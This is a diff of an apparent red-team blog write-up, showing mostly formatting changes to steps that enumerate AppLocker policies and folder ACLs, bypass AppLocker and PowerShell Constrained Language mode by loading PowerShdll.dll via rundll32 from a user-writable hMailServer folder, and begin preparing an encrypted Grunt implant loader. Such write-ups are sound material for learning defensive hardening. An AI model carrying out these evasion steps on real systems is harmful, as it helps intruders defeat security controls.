@@ -155,32 +155,31 @@ The whole attack is carried out on a low priv account.
 
 1. Identify a way to bypass AppLocker and ConstrainedLanguage  
 
-![broken]({{ site.baseurl }}/images/2021-16-01/everything_blocked.png  "All blocked")
+   ![broken]({{ site.baseurl }}/images/2021-16-01/everything_blocked.png  "All blocked")
 
-To check the current PS language mode we can run:  
-```
-$ExecutionContext.SessionState.LanguageMode
-```  
+   To check the current PS language mode we can run:  
+   ```
+   $ExecutionContext.SessionState.LanguageMode
+   ```  
 
-We can issue the following PS cmdlet to identify all AppLocker policies in place:  
-```
-Get-ApplockerPolicy -Effective -xml > c:\users\luemmel\Desktop\applocker.xml
-```  
+   We can issue the following PS cmdlet to identify all AppLocker policies in place:  
+   ```
+   Get-ApplockerPolicy -Effective -xml > c:\users\luemmel\Desktop\applocker.xml
+   ```  
 
-![broken]({{ site.baseurl }}/images/2021-16-01/applocker_allow_dll.png  "Allow dll")
+   ![broken]({{ site.baseurl }}/images/2021-16-01/applocker_allow_dll.png  "Allow dll")
 
-We can see that the **Everyone** group is allowed to run stuff from *C:\Program Files (x86)\hMailServer\\*\*
+   We can see that the **Everyone** group is allowed to run stuff from *C:\Program Files (x86)\hMailServer\\*\*
 
-We can further check the ACLs on that folder with the following PS cmdlet:  
-```
-Get-Acl -path 'C:\Program Files (x86)\hMailServer\' | fl
-```  
+   We can further check the ACLs on that folder with the following PS cmdlet:  
+   ```
+   Get-Acl -path 'C:\Program Files (x86)\hMailServer\' | fl
+   ```  
 
-![broken]({{ site.baseurl }}/images/2021-16-01/acl_users_allowed.png  "Allowed users ACL")
+   ![broken]({{ site.baseurl }}/images/2021-16-01/acl_users_allowed.png  "Allowed users ACL")
 
-Which shows us that the **Users** group has write access to that specific folder. *Perfect - someone fucked up here :)*  
+   Which shows us that the **Users** group has write access to that specific folder. *Perfect - someone fucked up here :)*  
 
-{:start="2"}
 2. Bypass AppLocker and ContrainedLanguage  
   
 So now that we know how - let´s get our hands dirty.  
@@ -192,6 +191,7 @@ rundll32 'C:\Program Files (x86)\hMailServer\PowerShdll.dll',main -w
 
  ![broken]({{ site.baseurl }}/images/2021-16-01/powershdll_popped.png  "PowerShdll popped")
 
+{:start="3"}
 3. Prepare Invoke-SharpLoader  
 Encrypt our default Grunt.exe    
 ```
